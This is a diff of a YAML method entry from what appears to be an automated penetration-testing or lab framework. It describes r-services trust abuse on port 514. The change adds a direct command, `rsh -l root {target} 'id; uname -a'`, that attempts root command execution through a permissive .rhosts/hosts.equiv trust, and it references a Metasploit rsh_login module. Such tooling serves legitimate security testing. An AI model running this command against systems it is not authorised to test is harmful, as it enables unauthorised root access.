@@ -84,13 +84,20 @@ methods:
     port: 514
     method: rservices
     summary: >-
-      r-services trust (`+ +` in .rhosts) lets `rsh -l root` run commands as root.
-      Its own wire protocol, so a raw `id` over nc does nothing.
+      r-services trust (`+ +` in .rhosts / hosts.equiv) lets `rsh -l root` run
+      commands as root. Its own wire protocol, so a raw `id` over nc does nothing —
+      it needs the rsh client (installed in the kali image, Stage 2).
     steps:
-      - "rsh -l root {target} id   (needs an rsh client — Stage 2)"
+      - "rsh -l root {target} id"
     tool: "rsh"
+    # Native non-MSF attempt (primary): the rsh client, now baked into the image.
+    # It resolves the port from /etc/services (`shell 514`). If the host's trust
+    # is not open to root the command returns no shell and the run records
+    # no_shell honestly; the MSF seed remains the complementary path.
+    attempt: >-
+      rsh -l root {target} 'id; uname -a'
     msf: "auxiliary/scanner/rservices/rsh_login"
-    dispatch: metasploit          # Stage 2 adds a native `attempt` once rsh is installed
+    dispatch: command
     success: {expect_shell: true}
     mutates: false
 
